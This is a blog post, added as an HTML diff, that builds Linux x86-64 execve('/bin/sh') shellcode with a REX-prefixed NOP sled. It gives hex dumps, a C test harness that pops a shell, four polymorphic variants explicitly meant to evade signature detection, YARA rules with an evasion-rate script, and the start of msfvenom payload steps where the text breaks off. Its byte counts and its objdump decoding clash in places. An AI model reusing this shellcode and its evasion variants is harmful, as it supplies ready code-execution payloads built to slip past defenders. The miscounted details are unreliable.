@@ -1,0 +1,1168 @@
+
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.4.0 -->
+<title>鬱 &mdash; Polymorphic Depression</title>
+
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="main.css"><link type="application/atom+xml" rel="alternate" href="" title="">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/brands.min.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/fontawesome.min.css"/>
+<link rel="icon" type="image/x-icon" href="ec.ico">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Libre+Caslon+Text:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Pirata+One&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Mrs+Saint+Delafield&display=swap" rel="stylesheet">
+</head>
+<style>
+.code-block {
+  position: relative;
+  max-width: 100%;
+  margin: 1.25rem 0;
+  padding: 1.2rem 1.25rem;
+  overflow-x: auto;
+
+  font-family: "cmu 2" serif;
+  font-size: clamp(0.78rem, 1.8vw, 0.95rem);
+  line-height: 1.65;
+
+  color: #353b48;
+  background: #f5f6fa;
+
+  border: 1px solid rgba(148, 163, 184, .25);
+  border-radius: 0px;
+
+}
+
+.code-block code {
+  display: block;
+  min-width: max-content;
+  white-space: pre;
+  tab-size: 4;
+}
+
+.code-block::before {
+  content: "CODE";
+  position: absolute;
+  top: .65rem;
+  right: .85rem;
+
+  padding: .25rem .55rem;
+  font-size: .68rem;
+  font-weight: 700;
+  letter-spacing: .08em;
+
+  color: #0f172a;
+  background: linear-gradient(90deg, #67e8f9, #f9a8d4, #fde68a);
+  border-radius: 0px;
+}
+
+.code-block.asm::before {
+  content: "ASM";
+}
+
+.code-block.c::before {
+  content: "C";
+}
+
+.code-block.hex::before {
+  content: "HEX";
+}
+
+.code-block.python::before {
+  content: "PYTHON";
+}
+
+
+@media (max-width: 640px) {
+  .code-block {
+    margin-inline: -0.25rem;
+    padding: 1rem;
+    border-radius: 0px;
+  }
+}
+
+@media (max-width:768px){
+
+    .code-block{
+        padding:16px;
+        font-size:14px;
+    }
+
+}
+@font-face {
+  font-family: 'cmu 1';
+  src: url('cmunbx.ttf') format('truetype');
+}
+@font-face {
+  font-family: 'cmu 2';
+  src: url('cmunrm.ttf') format('truetype');
+}
+h1.hack{
+
+
+
+  font-size:26px;
+  font-family: "cmu 2", serif;
+
+  font-style: normal;
+}
+.footer{
+    position: relative;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: #ffffff;
+    text-align: center;
+    color: #3d3d3d;
+}
+p.hack {
+  font-family: "cmu 2", serif;
+}
+
+.icons{
+    padding-top: 1rem;
+}
+
+.icons a{
+    text-decoration: none;
+    font-size: 2rem;
+    margin: 0.2rem;
+    color: #3d3d3d;
+}
+.icons a:hover{
+   color: #84817a;
+}
+.company-name{
+    font-size: 1.6rem;
+    margin-top: 0.5rem;
+}
+
+@media (max-width: 500px){
+    html{
+        font-size: 50%;
+    }
+}    
+
+@media(min-width: 501px) and (max-width: 768px){
+    html{
+    font-size: 50%;
+    }
+}    
+.tulisan p{
+        font-size: 1rem;
+}
+.tanda_tangan {
+  flex-shrink: 0; /* Prevent Chrome, Opera, and Safari from letting these items shrink to smaller than their content's default minimum size. */
+  padding: 30px;
+}
+.tanda_tangan p {
+  position: relative;
+  text-align: center;
+  font: 28.5px/2.70em 'Sinaloa Regular';
+  font-weight: 0;
+  -webkit-font-smoothing: initial;
+/*  letter-spacing: -0.100em;*/
+  line-height: 0.9;
+  text-transform: uppercase;
+  z-index: 1000;
+  margin: 0 auto;
+  display: block;
+  bottom: -5px;
+color:black;
+}
+@font-face {
+  font-family: "dmc5";
+  src: local("dmc5"), 
+       url("DMC5Font.otf") format("opentype");
+  font-weight: 400;        /* normal weight */
+  font-style: normal;
+  font-display: swap;      /* tampilkan fallback dulu, lalu swap ke font web saat siap */
+  unicode-range: U+000-5FF; /* optional: batasi range jika mau */
+}
+
+/* 2. Jika punya variasi weight/italic, buat satu @font-face per varian */
+@font-face {
+  font-family: "dmc5";
+  src: url("DMC5Font.otf") format("opentype");
+  font-weight: 700;
+  font-style: normal;
+  font-display: swap;
+}
+/* ===========================
+   Technical Table
+=========================== */
+
+.tech-table {
+    width: 100%;
+    margin: 24px 0;
+
+    border-collapse: collapse;
+    border: 2px solid black;
+
+    background: #f5f6fa;
+    color: black;
+
+    font-family: "cmu 2", serif;
+    font-size: 15px;
+
+    overflow: hidden;
+}
+
+.tech-table th {
+    padding: 14px 18px;
+
+    text-align: left;
+    font-weight: 700;
+border-color:black;
+    color: black;
+
+    background: #f1f2f6;
+
+    border-bottom: 1px solid black;
+}
+
+.tech-table td {
+    padding: 14px 18px;
+
+    border-bottom: 1px solid black;
+    border-right: 1px solid black;
+}
+
+.tech-table td:last-child,
+.tech-table th:last-child {
+    border-right: none;
+}
+
+.tech-table tr:last-child td {
+    border-bottom: none;
+}
+
+.tech-table tbody tr:nth-child(even) {
+    background: #f5f6fa;
+}
+
+.tech-table tbody tr:hover {
+    background: rgba(59,130,246,.12);
+    transition: .2s;
+}
+
+.tech-table code {
+    color: black;
+    font-family: "Jetbrains Mono", monospace;
+    font-size: 13px;
+}
+
+.tech-table strong {
+    color: #f8fafc;
+}
+
+@media (max-width:768px){
+
+.table-responsive{
+    overflow-x:auto;
+    width:100%;
+}
+
+.tech-table{
+    min-width:700px;
+}
+
+}
+
+/* ===========================
+   Note Box
+=========================== */
+
+.note-box {
+    margin: 32px 0;
+    padding: 18px 22px;
+
+    background: #f8fafc;
+
+    border: 1px solid #cbd5e1;
+    border-left: 5px solid #2563eb;
+
+    color: #334155;
+
+    box-sizing: border-box;
+}
+
+.note-box-title {
+    margin-bottom: 10px;
+
+    font-weight: 700;
+    font-size: 1rem;
+
+    color: #1d4ed8;
+
+    text-transform: uppercase;
+    letter-spacing: .06em;
+}
+
+.note-box p {
+    margin: 0;
+    line-height: 1.8;
+}
+
+.note-box code {
+    padding: 2px 6px;
+
+    background: #eef2ff;
+
+    border: 1px solid #c7d2fe;
+
+    font-family: "JetBrains Mono", monospace;
+}
+</style>
+<body>
+
+  <div class="wrapper"></div>
+</header><br>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name hack" itemprop="name headline">POLYMORPHIC DEPRESSION — Why Every Variant of Your Shellcode Eventually Points Back to You</h1>
+
+  <div class="post-content e-content" itemprop="articleBody">
+<p>In somewhere this shellcode, it's a compact, sneaky little beast clearly been hand-tuned for evasion. The hex string is <code class="">44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7</code>, which assembles to 16 byte of x86-64 machine code</p>
+<h3>Raw hex & Disassembly</h3>
+<p><pre class="code-block hex">44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7</pre></p>
+<p>Let's decode this in x86-64 mode:</p>
+<div class="table-responsive">
+
+<table class="tech-table">
+
+<thead>
+<tr>
+    <th>Offset</th>
+    <th>Bytes</th>
+    <th>Instruction</th>
+    <th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+
+<tr>
+    <td><code>+0x00</code></td>
+    <td><code>44 90</code></td>
+    <td><code>REX.R NOP</code></td>
+    <td>2-byte NOP with REX.R prefix</td>
+</tr>
+
+<tr>
+    <td><code>+0x02</code></td>
+    <td><code>0x90</code> × 7</td>
+    <td><code>NOP</code></td>
+    <td>7 single-byte NOPs</td>
+</tr>
+
+<tr>
+    <td><code>+0x09</code></td>
+    <td><code>44</code></td>
+    <td><code>REX.R</code> (prefix)</td>
+    <td>Standalone REX.R byte — harmless in a NOP sled</td>
+</tr>
+
+<tr>
+    <td><code>+0x0a</code></td>
+    <td><code>48 31 ff</code></td>
+    <td><code>xor rdi, rdi</code></td>
+    <td>Zero out RDI register</td>
+</tr>
+
+<tr>
+    <td><code>+0x0d</code></td>
+    <td><code>48 f7 e7</code></td>
+    <td><code>mul rdi</code></td>
+    <td>Multiply RAX by RDI (zeroes RAX and RDX)</td>
+</tr>
+</tbody>
+
+</table>
+
+</div>
+<p>Or full shellcode in objdump view:</p>
+<p><pre class="code-block asm">
+00000000  44		inc     eax
+00000001  90		nop
+00000002  90		nop
+... (NOPs continue to offset 0x9)
+00000009  44		inc     eax
+0000000A  48 31 ff	xor     rdi, rdi
+0000000D  48 F7 E7	mul     rdi
+</pre></p>
+<h3>Breaking Down the NOP Sled (Bytes <code>44 90 90...</code>)</h3>
+<p>The first 10 bytes form a multi-byte NOP sled — a classic exploit technique used to increase the probability of landing execution flow on the real shellcode when control of the instruction pointer is imprecise.</p>
+<h4>The <code>44 90</code> Sequence</h4>
+<p>The byte <code>0x44</code> is a <code>REX.R</code> prefix in x86-64. When placed before <code>0x90</code> (a single-byte NOP), the CPU interprets this as a valid (though longer) no-operation instruction:</p>
+<div class="table-responsive">
+
+<table class="tech-table">
+
+<thead>
+<tr>
+    <th>Encoding</th>
+    <th>Meaning</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+    <td><code>0x90</code></td>
+    <td><code>NOP</code> (1 byte)</td>
+</tr>
+
+<tr>
+    <td><code>44 90</code></td>
+    <td><code>REX.R NOP</code> (2 bytes)</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<p>This is specifically uses <code>0x44</code> prefix here rather than the more common <code>0x66</code> (operand-size override) NOP variants. Why? Two reasons:</p>
+<ol>
+<li>Evasion. Signature-based NIDS (Snort, Suricata) often look for patterns of consecutive <code>0x90</code> bytes. Mixing in REX prefixes changes the byte pattern without changing execution semantics.</li>
+<li>Bad character avoidance. If the target buffer filters certain bytes, <code>0x44</code> may be allowed where <code>0x90</code>-only sleds are flagged.</li>
+</ol>
+<p>The structure of the sled is:</p>
+<p><pre>44 90   — 2-byte NOP (REX.R + NOP)
+90       — 1-byte NOP  × 7
+44       — orphan REX.R prefix (harmless)</pre></p>
+<p>Total: 10 bytes of landing zone.</p>
+<h3>The Payload: Zeroing Registers (Bytes <code>48 31 ff 48 f7 e7</code>)</h3>
+<p>After the sled, we hit the actual shellcode:</p>
+<p><code>48 31 ff</code> — <code>xor rdi, rdi</code></p>
+<ul>
+<li><code>48</code> = REX.W prefix (64-bit operand size)</code>
+<li><code>31</code> = XOR r/m64, r64 opcode</code>
+<li><code>ff</code> = ModRM byte encoding rdi as both source and destination</code>
+</ul>
+<p>Result: <code>RDI = 0</code></p>
+
+<p>This zeros the rdi register, which on Linux x86-64 serves as the first argument register to syscalls. For an <code>execve("/bin/sh")</code> shellcode, setting <code>rdi = 0</code> would be the argument for <code>sys_read</code> (stdin), but here it has a more important purpose — it's preparing a zero value for the multiplication trick coming next.</p>
+
+<p><code>48 f7 e7</code> — <code>mul rdi</code></p>
+<ul>
+  <li><code>48</code> = REX.W prefix (64-bit)</code></li>
+  <li><code>f7</code> = MUL r/m64 opcode group</li>
+  <li><code>e7</code> = ModRM byte encoding rdi (operand is rdi)</li>
+</ul>
+<p>Operation: <code>RDX:RAX = RAX × RDI</code></p>
+
+<p>Since we just zeroed <code>rdi</code>:</p>
+<p><pre>RAX = RAX × 0 = 0
+RDX = 0 (high half of the result)</pre></p>
+<p>Result after these two instructions:</p>
+<div class="table-responsive">
+
+<table class="tech-table">
+
+<thead>
+<tr>
+    <th>Register</th>
+    <th>Value</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+    <td><code>RAX</code></td>
+    <td><code>0</code></td>
+</tr>
+
+<tr>
+    <td><code>RDX</code></td>
+    <td><code>0</</code></td>
+</tr>
+<tr>
+    <td><code>RDI</code></td>
+    <td><code>0</code></td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<p>Three registers zeroed in just 5 bytes. This is a well-known optimization trick — <code>mul rdi</code> is only 3 bytes (<code>48 f7 e7</code>), whereas the conventional <code>xor rax, rax</code> plus <code>xor rdx, rdx</code> would take 6 bytes (<code>48 31 c0 48 31</code> d2). Also saves 1 byte by chaining the multiplication.</p>
+
+<h3>Putting It in Context</h3>
+<p>This is almost certainly the <b>setup preamble</b> for an <code>execve("/bin/sh")</code> syscall. After these 16 bytes, a complete shellcode would continue with:</p>
+
+<div class="table-responsive">
+
+<table class="tech-table">
+
+<thead>
+<tr>
+    <th>Instruction</th>
+    <th>Purpose</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+    <td><code>mov rdi, <"/bin/sh" addr></code></td>
+    <td>Argument 1: pointer to command string</td>
+</tr>
+
+<tr>
+    <td><code>xor rsi, rsi</code></td>
+    <td>Argument 2: argv = NULL</td>
+</tr>
+<tr>
+    <td><i>(RDX already zeroed)</i></td>
+    <td>Argument 3: envp = NULL</td>
+</tr>
+<tr>
+    <td><code>mov al, 59</code></td>
+    <td>Syscall number for <code>execve</code></td>
+</tr>
+<tr>
+    <td><code>syscall</code></td>
+    <td>Invoke the kernel</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<p>The conventional register-zeroing for execve requires:</p>
+<ul>
+    <li><code>rax = 0</code> (syscall number comes later)</li>
+    <li><code>rdi = 0</code> (or pointer to string)</li>
+    <li><code>rdx = 0</code></li>
+</ul>
+<p>All three are satisfied by just <code>xor rdi, rdi + mul rdi</code>.</p>
+
+<h3>Signature Analysis</h3>
+
+<p>YARA rule match:</p>
+<p><pre>rule Shellcode_Preamble_ZeroRegisters_MulTrick
+{
+    meta:
+        description = "Detects x64 shellcode preamble using xor rdi + mul rdi trick"
+        author = "febnug"
+        arch = "x86-64"
+    strings:
+        $sled = { 44 90 90 90 90 90 90 90 90 44 }
+        $preamble = { 48 31 ff 48 f7 e7 }
+    condition:
+        $preamble or ($sled and $preamble)
+}</pre></p>
+<p>Evasion notes:</p>
+<ul>
+<li>The <code>44 90</code> REX-prefixed NOP sequences evade naive <code>0x90</code>-counting signatures</li>
+<li>The <code>mul rdi</code> trick avoids the more commonly signatured <code>48 31 c0</code> (<code>xor rax, rax</code>) pattern</li>
+<li>This is a Level-1 polymorphic variant — the register-zeroing destination can be altered (e.g., <code>mul rbx</code> after <code>xor rbx, rbx</code>) to produce functionally identical but byte-different shellcode</li>
+</ul>
+<h3>Conclusion</h3>
+
+<p>This 16-byte shellcode snippet is a compact, evasion-aware preamble. Demonstrates how solid understanding of:</p>
+<ul>
+    <li>x86-64 prefix encoding (REX.R for padded NOPs)</li>
+    <li>Multi-byte NOP sled construction for buffer overflow reliability</li>
+    <li>Instruction optimization (saving bytes with mul over xor sequences)</li>
+    <li>Signature evasion through non-standard byte patterns</li>
+</ul>
+<h3>Complete Shellcode: <code>execve("/bin/sh")</code> with the NOP Sled + Zeroing Preamble</h3>
+
+<h4>Strategy</h4>
+
+<p>After preamble zeros <code>rax</code>, <code>rdi</code>, and <code>rdx</code>, we need to:
+<ol>
+    <li>Push a null-terminated <code>/bin/sh</code> string onto the stack</li>
+    <li>Set <code>rdi</code> to point to that string</li>
+    <li>Set <code>rsi = 0</code> (argv = NULL)</li>
+    <li>Set <code>rax = 59</code> (execve syscall number)</li>
+    <li>Execute syscall</li>
+</ol>
+<h4>Assembly Source</h4>
+<p><pre class="code-block asm">
+; x86-64 execve("/bin/sh") shellcode
+; Total: 34 bytes
+; Platform: Linux x86-64
+
+BITS 64
+
+_start:
+    ; --- Preamble (16 bytes) ---
+    db 0x44, 0x90               	; REX.R NOP (2-byte)
+    db 0x90, 0x90, 0x90         	; NOP x3
+    db 0x90, 0x90, 0x90, 0x90   	; NOP x4
+    db 0x44                     	; orphan REX.R (harmless)
+    db 0x48, 0x31, 0xff         	; xor rdi, rdi
+    db 0x48, 0xf7, 0xe7         	; mul rdi   ; rax=0, rdx=0, rdi=0
+
+    ; --- Shellcode body (18 bytes) ---
+    movabs rbx, 0x68732f6e69622f
+    ; rbx = "/bin/sh" (little-endian: hs/nib/)
+
+    push   rdx                  	; null terminator (rdx is 0)
+    push   rbx                  	; push "/bin/sh\0"
+    push   rsp                  	; argv[0] = pointer to string
+    pop    rdi                  	; rdi = address of "/bin/sh"
+
+    ; rsi already 0 from the dynamic environment (or we set it)
+    cdq                        		; sign-extend rax into rdx (rdx already 0, this is a NOP here — safe)
+    ; Actually, let's explicitly zero rsi to be clean
+    push   rdx                  	; argv terminator
+    push   rdi                  	; argv[0]
+    pop    rsi                  	; rsi = argv pointer
+
+    push   59                   	; __NR_execve = 59
+    pop    rax                  	; rax = syscall number
+    syscall
+</pre></p>
+
+<h4>Optimized Assembly (28 bytes total including preamble)</h4>
+<p><pre class="code-block asm">
+BITS 64
+
+; ============================================
+; Linux x86-64 execve("/bin/sh") — 28 bytes
+; ============================================
+
+_start:
+    ; --- NOP sled + zeroing preamble (16 bytes) ---
+    db 0x44, 0x90               	; REX.R NOP
+    times 7 db 0x90             	; NOP x7
+    db 0x44                     	; orphan REX.R
+    db 0x48, 0x31, 0xff         	; xor  rdi, rdi   ; rdi = 0
+    db 0x48, 0xf7, 0xe7         	; mul   rdi       ; rax=0, rdx=0
+
+    ; --- Body (12 bytes) ---
+    mov    rbx, 0x68732f6e69622f 	; rbx = "/bin/sh"
+    push   rbx                   	; push string
+    push   rsp                   	; argv[0] = pointer
+    pop    rdi                   	; rdi = &"/bin/sh"
+    xor    rsi, rsi              	; rsi = NULL argv
+    xor    rdx, rdx              	; rdx = NULL envp  (already zero, but safe)
+    mov    al, 59                	; syscall: execve
+    syscall
+</pre></p>
+<h4>Final Hex Dump</h4>
+<p><pre class="code-block hex">44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7  	; preamble (16 bytes)
+48 bb 2f 62 69 6e 2f 73 68 00                     	 	; mov rbx, "/bin/sh\0"  (10 bytes)
+53                                                	 				; push rbx             (1 byte)
+54                                                	 				; push rsp             (1 byte)
+5f                                                	 				; pop rdi              (1 byte)
+48 31 f6                                          	 			; xor rsi, rsi        (3 bytes)
+48 31 d2                                          	 			; xor rdx, rdx        (3 bytes)
+b0 3b                                             	 			; mov al, 59          (2 bytes)
+0f 05                                             	 				; syscall             (2 bytes)</pre></p>
+
+<p><b>Total: 39 bytes</b></p>
+<h4>C Test Harness</h4>
+<pre class="code-block c">#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    unsigned char shellcode[] = {
+        // Preamble (16 bytes)
+        0x44, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+        0x90, 0x44, 0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7,
+        // Body (23 bytes)
+        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
+        0x68, 0x00, 0x53, 0x54, 0x5f, 0x48, 0x31, 0xf6,
+        0x48, 0x31, 0xd2, 0xb0, 0x3b, 0x0f, 0x05
+    };
+
+    // Make memory executable
+    void *exec = mmap(NULL, sizeof(shellcode),
+                      PROT_READ | PROT_WRITE | PROT_EXEC,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memcpy(exec, shellcode, sizeof(shellcode));
+
+    printf("[+] Shellcode length: %zu bytes\n", sizeof(shellcode));
+    printf("[+] Executing...\n\n");
+
+    ((void(*)())exec)();
+
+    return 0;
+}
+</pre>
+<p>Compile and test:</p>
+<pre>febri@ubuntu:~$ gcc -z execstack -o test_shellcode test_shellcode.c
+febri@ubuntu:~$ ./test_shellcode
+[+] Shellcode length: 39 bytes
+[+] Executing...
+
+$ </pre>
+
+<p>and... pop up shell :)</p>
+
+<h3>Polymorphic Variants</h3>
+<p>Here are hand-crafted variants to help with signature evasion:</p>
+<h4>Variant 1 — RDI→RBX Rotation</h4>
+
+<p>Changes the zeroing target register to break <code>mul rdi</code> signatures.</p>
+
+<p><pre class="code-block hex">44 90 90 90 90 90 90 90 90 44
+48 31 db       	; xor rbx, rbx
+48 f7 e3       	; mul rbx       (rax=0, rdx=0)</pre></p>
+
+<p>I just wrote a script for that, this is a example:</p>
+<p><pre>febri@ubuntu:~/variant-1$ gcc -z execstack -o payload_variant1 payload_variant1.c && echo id | ./payload_variant1
+[+] Variant 1 — RDI->RBX Rotation
+[+] Length: 39 bytes
+[+] xor rbx, rbx  |  mul rbx  (rax=0, rdx=0)
+[+] Breaks YARA: 48 31 ff + 48 f7 e7
+
+[+] Executing...
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~/variant-1$</pre></p>
+
+<h4>Variant 2 — XOR Chain (No MUL)</h4>
+
+<p>Avoids <code>mul</code> entirely by using direct XORs. Slightly larger but avoids the 3-byte MUL signature.</p>
+<p><pre class="code-block hex">44 90 90 90 90 90 90 90 90 44
+48 31 c0       	; xor rax, rax  (2 bytes... wait, that's 3)
+48 31 ff       	; xor rdi, rdi
+48 31 d2       	; xor rdx, rdx  ; 16 bytes total</pre></p>
+
+<p>I just wrote a script for that, this is a example:</p>
+<p><pre>febri@ubuntu:~/variant-2$ gcc -z execstack -o payload_variant2 payload_variant2.c && echo id | ./payload_variant2
+[+] Variant 2 — XOR Chain (No MUL)
+[+] Length: 42 bytes
+[+] Zeroing: xor rax,rax, xor rdi,rdi, xor rdx,rdx
+[+] Evades: all mul r* signatures (48 f7 e*)
+
+[+] Executing...
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~/variant-2$</pre></p>
+
+<h4>Variant 3 — SUB Trick</h4>
+
+<p>Uses <code>sub</code> instead of <code>xor</code>/<code>mul</code> to zero registers (different byte signature).</p>
+
+<p><pre class="code-block hex">44 90 90 90 90 90 90 90 90 44
+48 29 ff       	; sub rdi, rdi  ; rdi = 0
+48 29 c0       	; sub rax, rax  ; rax = 0
+48 29 d2       	; sub rdx, rdx  ; rdx = 0</pre></p>
+
+<p>I just wrote a script for that, this is a example:</p>
+<p><pre>febri@ubuntu:~/variant-3$ gcc -z execstack -o payload_variant3 payload_variant3.c && echo id | ./payload_variant3
+[+] Variant 3 — SUB Trick
+[+] Length: 42 bytes
+[+] Zeroing: sub rdi,rdi, sub rax,rax, sub rdx,rdx
+[+] Evades: xor r* (48 31 *) and mul r* (48 f7 e*) signatures
+
+[+] Executing...
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~/variant-3$</pre></p>
+
+<h4>Variant 4 — Push/Pop with MUL</h4>
+<p><pre class="code-block hex">44 90 90 90 90 90 90 90 90 44
+6a 00          	; push 0
+5f             	; pop rdi       ; rdi = 0
+48 f7 e7       	; mul rdi       ; rax=0, rdx=0</pre></p>
+
+<p>I just wrote a script for that, this is a example:</p>
+<p><pre>febri@ubuntu:~/variant-4$ gcc -z execstack -o payload_variant4 payload_variant4.c && echo id | ./payload_variant4
+[+] Variant 4 — Push/Pop with MUL
+[+] Length: 39 bytes
+[+] Zeroing: push 0; pop rdi; mul rdi
+[+] Evades: xor rdi (48 31 ff), xor rax (48 31 c0), sub rdi (48 29 ff)
+
+[+] Executing...
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~/variant-4$</pre></p>
+
+
+<h3>YARA Rule to Catch All These</h3>
+<p><pre>rule Shellcode_Preamble_Variants {
+    meta:
+        description = "Detects x64 execve preamble variants with NOP sled + register zeroing"
+        author = "febnug"
+    strings:
+        $sled     = { 44 90 90 90 90 90 90 90 90 44 }
+        $sled2    = { 44 90 90 90 90 90 90 90 90 }
+        $xor_mul  = { 48 31 ff 48 f7 e7 }
+        $xor_rbx  = { 48 31 db 48 f7 e3 }
+        $sub_sub  = { 48 29 ff 48 29 c0 }
+        $push_pop = { 6a 00 5f 48 f7 e7 }
+        $xor_chain = { 48 31 c0 48 31 ff 48 31 d2 }
+        $sub_chain = { 48 29 ff 48 29 c0 48 29 d2 }
+    condition:
+        ($sled or $sled2) and any of ($xor_mul, $xor_rbx, $sub_sub, $push_pop, $xor_chain, $sub_chain)
+}
+</pre></p>
+<p>Let's test it, and save that rule with <code>shellcode_variants.yara</code>, then show which strings matched</p>
+<p><pre>for f in test_*.bin; do
+    echo "=== $f ==="
+    yara -s shellcode_variants.yara "$f" 2>/dev/null
+    echo ""
+done</pre></p>
+<p>Result:</p>
+<p><pre>=== test_evasive.bin ===
+
+=== test_original.bin ===
+Shellcode_Preamble_Variants test_original.bin
+0x0:$sled: 44 90 90 90 90 90 90 90 90 44
+0x0:$sled2: 44 90 90 90 90 90 90 90 90
+0xa:$xor_mul: 48 31 FF 48 F7 E7
+
+=== test_variant1.bin ===
+Shellcode_Preamble_Variants test_variant1.bin
+0x0:$sled: 44 90 90 90 90 90 90 90 90 44
+0x0:$sled2: 44 90 90 90 90 90 90 90 90
+0xa:$xor_rbx: 48 31 DB 48 F7 E3
+
+=== test_variant2.bin ===
+Shellcode_Preamble_Variants test_variant2.bin
+0x0:$sled: 44 90 90 90 90 90 90 90 90 44
+0x0:$sled2: 44 90 90 90 90 90 90 90 90
+0xa:$xor_chain: 48 31 C0 48 31 FF 48 31 D2
+
+=== test_variant3.bin ===
+Shellcode_Preamble_Variants test_variant3.bin
+0x0:$sled: 44 90 90 90 90 90 90 90 90 44
+0x0:$sled2: 44 90 90 90 90 90 90 90 90
+0xa:$sub_sub: 48 29 FF 48 29 C0
+0xa:$sub_chain: 48 29 FF 48 29 C0 48 29 D2
+
+=== test_variant4.bin ===
+Shellcode_Preamble_Variants test_variant4.bin
+0x0:$sled: 44 90 90 90 90 90 90 90 90 44
+0x0:$sled2: 44 90 90 90 90 90 90 90 90
+0xa:$push_pop: 6A 00 5F 48 F7 E7</pre></p>
+
+<p>Or, with full automation script</p>
+<p><pre>#!/bin/bash
+RULE="shellcode_variants.yara"
+echo "=========================================="
+echo " YARA EVASION TEST"
+echo " Rule: $RULE"
+echo " Date: $(date)"
+echo "=========================================="
+echo ""
+
+total=0
+detected=0
+evaded=0
+
+for f in test_*.bin; do
+    if [ ! -f "$f" ]; then continue; fi
+    total=$((total + 1))
+    
+    # Test with yara
+    match=$(yara "$RULE" "$f" 2>/dev/null)
+    
+    if [ -n "$match" ]; then
+        detected=$((detected + 1))
+        # Get matched strings
+        strings=$(yara -s "$RULE" "$f" 2>/dev/null | grep -oP '0x[0-9a-f]+:\$\w+' | tr '\n' ' ')
+        printf "DETECTED  %-30s  %s\n" "$(basename $f)" "$strings"
+    else
+        evaded=$((evaded + 1))
+        printf "EVADED    %-30s\n" "$(basename $f)"
+    fi
+done
+
+echo ""
+echo "=========================================="
+printf " TOTAL:  %d\n" $total
+printf " DETECT: %d\n" $detected
+printf " EVADE:  %d\n" $evaded
+printf " RATE:   %d%% evasion\n" $(( (evaded * 100) / total ))
+echo "=========================================="</pre></p>
+
+<p>Save it, and <code>chmod +x yara_test.sh</code></p>
+
+<p>Result:</p>
+<p><pre>febri@ubuntu:~/yara$ ./yara_test.sh 
+==========================================
+ YARA EVASION TEST
+ Rule: shellcode_variants.yara
+ Date: Wed Jul  1 12:02:18 AM WIB 2026
+==========================================
+
+EVADED    test_evasive.bin              
+DETECTED  test_original.bin               0x0:$sled 0x0:$sled2 0xa:$xor_mul 
+DETECTED  test_variant1.bin               0x0:$sled 0x0:$sled2 0xa:$xor_rbx 
+DETECTED  test_variant2.bin               0x0:$sled 0x0:$sled2 0xa:$xor_chain 
+DETECTED  test_variant3.bin               0x0:$sled 0x0:$sled2 0xa:$sub_sub 0xa:$sub_chain 
+DETECTED  test_variant4.bin               0x0:$sled 0x0:$sled2 0xa:$push_pop 
+
+==========================================
+ TOTAL:  6
+ DETECT: 5
+ EVADE:  1
+ RATE:   16% evasion
+==========================================
+febri@ubuntu:~/yara$</pre></p>
+
+<p>The 16% evasion rate is because <code>test_evasive.bin</code> uses a shorter sled (9 bytes instead of 10) and only <code>sub rax+rdx</code> (no <code>rdi</code>). To increase the evade rate, we need variants that use completely different sled patterns and different register zeroing sequences that aren't in the rule.</p>
+
+<h3>Playing with Metasploit</h3>
+<p>Let's play with msfvenom to test it!</p>
+<h4>Generate the shellcode without the preamble first</h4>
+<p><pre># Generate just the execve payload (no prepend, no pad)
+msfvenom -p linux/x64/exec CMD="/bin/sh" -f raw -o body.bin</pre></p>
+<h4>Manually prepend with 16-byte preamble</h4>
+<p><pre># Using printf to write the preamble + body
+(printf '\x44\x90\x90\x90\x90\x90\x90\x90\x90\x44\x48\x31\xff\x48\xf7\xe7'; cat body.bin) > payload_raw.bin</pre></p>
+<p>Verify the bytes</p>
